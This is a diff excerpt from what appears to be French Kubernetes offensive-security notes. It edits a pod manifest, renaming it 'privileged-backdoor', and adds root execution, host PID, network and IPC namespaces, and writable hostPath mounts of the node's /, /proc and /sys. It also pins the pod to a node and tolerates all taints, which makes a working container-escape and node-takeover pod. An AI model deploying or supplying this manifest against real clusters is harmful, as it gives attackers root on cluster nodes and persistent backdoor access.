@@ -29,25 +29,42 @@ Vérifier surtout : `pods (create)`, `hostPath` non bloqué par PSA/PSP/OPA.
 apiVersion: v1
 kind: Pod
 metadata:
-  name: escape
-  namespace: <namespace>
+  name: privileged-backdoor
+  namespace: default
 spec:
-  hostPID: true
   hostNetwork: true
+  hostPID: true
   hostIPC: true
+  automountServiceAccountToken: true
+  nodeName: <node-name>
   containers:
-  - name: escape
+  - name: infiltr8
     image: alpine
-    command: ["/bin/sh", "-c", "sleep 3600"]
+    command: ["/bin/sh"]
+    args: ["-c", "sleep 3600"]
     securityContext:
       privileged: true
+      runAsUser: 0
     volumeMounts:
-    - name: host
+    - name: host-root
       mountPath: /host
+      readOnly: false
+    - name: host-proc
+      mountPath: /host/proc
+      readOnly: false
+    - name: host-sys
+      mountPath: /host/sys
+      readOnly: false
   volumes:
-  - name: host
+  - name: host-root
     hostPath:
       path: /
+  - name: host-proc
+    hostPath:
+      path: /proc
+  - name: host-sys
+    hostPath:
+      path: /sys
   tolerations:
   - operator: Exists
 ```
